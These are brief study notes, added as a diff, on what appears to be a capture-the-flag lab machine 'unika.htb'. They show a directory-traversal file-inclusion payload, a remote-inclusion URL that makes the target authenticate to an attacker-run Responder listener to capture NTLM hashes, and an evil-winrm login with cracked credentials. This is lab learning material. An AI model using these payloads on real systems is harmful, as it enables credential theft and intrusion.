@@ -1,0 +1,8 @@
+To check for *Local File Inclusion or *Remote File Inclusion  you can do so by looking for the "/system32/drivers/etc/hosts" by passing it to the web server like this after page=  : http://unika.htb/index.php?
+page=../../../../../../../../windows/system32/drivers/etc/hosts
+NTLM = \(New Technology Lan Manager\) 
+* a hash function is a function that takes data and returns a fixed size value they are used for storing passwords more securely
+* an NTHash is the output of the algorithm used to store passwords on windows systems in the SAM database
+Run Responder to get the remote host to authenticate to you
+After starting responder , you can tell the website to try to load your file on your machine and responder will capture the connection ,  http://unika.htb/index.php?page=//10.10.14.142/file.txt
+After getting the password from John , connect to the winRM service via Evil-WinRM with the command : evil-winrm -i 10.129.136.91 -u username -p password
